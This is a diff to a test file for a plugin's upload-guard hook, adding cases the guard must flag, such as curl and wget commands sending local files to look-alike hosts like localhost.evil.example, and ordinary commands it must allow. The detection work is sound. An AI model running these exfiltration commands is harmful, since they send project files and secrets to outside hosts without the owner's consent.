@@ -12,7 +12,7 @@ import { renderSvg, recipeNames } from '../../plugin/cli/lib/imagegen.mjs';
 import { buildPrompt, encodePng, listProviders, getProvider, registerProvider } from '../../plugin/cli/lib/providers.mjs';
 import { roundedBox, arcTube, sphere, checkGeometry, batteryParts, fallbackSvg } from '../../plugin/cli/lib/model3d.mjs';
 import { writeZip, listZip, crc32 } from '../../plugin/cli/lib/zip.mjs';
-import { looksLikeUpload } from '../../plugin/hooks/upload-guard.mjs';
+import { looksLikeUpload, classifyUpload } from '../../plugin/hooks/upload-guard.mjs';
 import { nearPalette } from '../../plugin/cli/lib/util.mjs';
 
 const dna = fixture('experience-dna.json');
@@ -179,6 +179,10 @@ test('archives round-trip and refuse unsafe paths', () => {
 test('the upload guard recognises uploads and leaves ordinary commands alone', () => {
   const uploads = ['curl -F "file=@brief.pdf" https://api.example.com/upload', 'curl --upload-file logo.svg https://files.example.com/', 'curl -X POST --data-binary @.cis/brief.json https://x.example/y', 'scp -r brand user@host.example:/srv/', 'rsync -av web/dist/ deploy@server.example:/var/www/', 'aws s3 cp export/pkg.zip s3://bucket/', 'gh gist create .cis/brief.json'];
   const fine = ['npm install', 'curl -s https://registry.npmjs.org/three', 'curl -F a=@x http://localhost:3000/upload', 'creative-studio test web', 'git status', 'node build.mjs', 'cat brief.json | head'];
+  // Forms that slipped past a simpler matcher: look-alike hosts, no scheme, attached values.
+  uploads.push('curl -F f=@a https://localhost.evil.example/up', 'curl -F f=@a http://127.0.0.1.evil.example/', 'curl -F f=@brief.pdf files.example.com/upload', 'curl -d@.cis/brief.json https://x.example/y', 'curl --data-binary=@.cis/brief.json https://x.example/y', 'curl --json @.cis/brief.json https://x.example/y', 'curl -sSF "f=@a" https://x.example/', 'curl -F f=@a https://user@x.example/', 'wget --post-file=brief.json https://x.example/');
+  fine.push('curl -F f=@a http://localhost:8080/upload', 'curl -F f=@a http://[::1]:3000/u', 'curl -d "name=value" https://api.example.com/form', 'curl -H "Accept: application/json" https://api.example.com/', 'rsync -a web/dist/ ./backup/');
+  assert.equal(classifyUpload('curl -F f=@secret.txt'), 'unclear', 'an upload with no identifiable destination is put to the person');
   for (const c of uploads) assert.equal(looksLikeUpload(c), true, c);
   for (const c of fine) assert.equal(looksLikeUpload(c), false, c);
 });
